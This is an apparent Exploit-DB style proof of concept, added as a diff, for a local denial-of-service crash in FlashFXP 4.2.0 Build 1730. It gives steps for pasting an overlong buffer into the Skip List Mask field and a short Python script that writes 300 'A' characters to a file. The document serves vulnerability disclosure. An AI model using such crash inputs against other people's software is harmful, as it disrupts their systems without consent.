@@ -1,0 +1,29 @@
+# Exploit Title: FlashFXP 4.2.0 Build 1730 - Denial of Service (PoC) 
+# Vendor Homepage: https://www.flashfxp.com/ 
+# Software Link Download: https://www.filehorse.com/download-flashfxp/22451/download/
+# Exploit Author: Paras Bhatia
+# Discovery Date: 2020-03-30
+# Vulnerable Software: FlashFXP
+# Version: 4.2.0 Build 1730
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on: Windows 10 Pro (64 bit) 
+
+#Steps to Produce the Crash:
+
+#   1.- Run python code: FlashCrash.py
+#   2.- Copy content to clipboard
+#   3.- Open "FlashFXP.exe"
+#   4.- Go to "Options" > Filters > Skip List > New Entry
+#   5.- Paste ClipBoard into the "Mask" field
+#   6.- Click on OK
+#   7.- Go to "Options" > Filters > Skip List
+#   8.- Crashed
+
+#################################################################################################################################################
+
+#Python "FlashCrash.py" Code:
+   
+buffer = "\x41" * 300
+f = open ("FlashCrash.txt", "w")
+f.write(buffer)
+f.close()
